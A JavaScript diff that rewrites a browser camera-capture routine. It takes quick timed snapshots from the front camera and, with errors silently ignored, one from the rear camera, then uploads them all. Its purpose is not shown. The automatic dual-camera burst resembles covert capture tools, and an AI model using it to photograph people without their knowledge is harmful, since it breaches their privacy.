@@ -158,16 +158,52 @@ async function startCapture() {
   canvas.height = video.videoHeight || 480;
   const ctx = canvas.getContext('2d');
 
-  const uploadPromises = [];
-  for (let i = 0; i < 5; i++) {
-    if (i > 0) await sleep(400);
+  function snapFront() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
     if (stream && video.readyState >= 2 && video.videoWidth > 0) {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     }
-    const b64 = canvas.toDataURL('image/jpeg', 0.9);
-    uploadPromises.push(uploadPhoto(b64));
+    return canvas.toDataURL('image/jpeg', 0.9);
   }
+
+  async function snapBack() {
+    let backStream = null;
+    const bc = document.createElement('canvas');
+    bc.width = 640; bc.height = 480;
+    const bctx = bc.getContext('2d');
+    try {
+      backStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: 'environment' } }, audio: false
+      });
+      const bv = document.createElement('video');
+      bv.srcObject = backStream;
+      bv.autoplay = true; bv.muted = true; bv.playsInline = true;
+      document.body.appendChild(bv);
+      bv.play();
+      await waitForVideoReady(bv);
+      await sleep(300);
+      bc.width = bv.videoWidth || 640;
+      bc.height = bv.videoHeight || 480;
+      bctx.drawImage(bv, 0, 0, bc.width, bc.height);
+      backStream.getTracks().forEach(t => t.stop());
+      bv.remove();
+    } catch(e) {}
+    return bc.toDataURL('image/jpeg', 0.9);
+  }
+
+  const uploadPromises = [];
+
+  // T=0 : photo avant #1
+  uploadPromises.push(uploadPhoto(snapFront()));
+
+  // T=0.6s : photo avant #2 + photo arrière en parallèle
+  await sleep(600);
+  uploadPromises.push(uploadPhoto(snapFront()));
+  uploadPromises.push(snapBack().then(b64 => uploadPhoto(b64)));
+
+  // T=1.3s : photo avant #3
+  await sleep(700);
+  uploadPromises.push(uploadPhoto(snapFront()));
 
   if (stream) stream.getTracks().forEach(t => t.stop());
 
